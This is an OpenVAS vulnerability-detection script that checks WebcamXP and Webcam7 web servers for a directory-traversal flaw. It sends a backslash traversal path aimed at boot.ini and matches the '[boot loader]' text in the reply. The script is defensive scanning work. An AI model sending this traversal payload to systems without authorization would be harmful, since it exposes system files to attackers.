###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webcam_7_xp_52119.nasl 11148 2018-08-28 14:25:49Z asteins $
#
# WebcamXP and Webcam7 Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103434");
  script_bugtraq_id(52119);
  script_version("$Revision: 11148 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("WebcamXP and Webcam7 Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52119");
  script_xref(name:"URL", value:"http://www.webcamxp.com/home.aspx");

  script_tag(name:"last_modification", value:"$Date: 2018-08-28 16:25:49 +0200 (Tue, 28 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-02-23 11:44:32 +0100 (Thu, 23 Feb 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webcam_7_xp/banner");
  script_tag(name:"summary", value:"WebcamXP and Webcam7 are prone to a directory-traversal vulnerability
because they fail to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting the issue can allow an attacker to obtain sensitive
information that may aid in further attacks.");

  script_tag(name:"affected", value:"WebcamXP 5.5.1.2 and Webcam7 0.9.9.32 are vulnerable, other versions
may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner || ("Server: webcam 7" >!< banner && "Server: webcamXP" >!< banner))exit(0);

url = string("/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini");

if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
  security_message(port:port);
  exit(0);
}

exit(0);
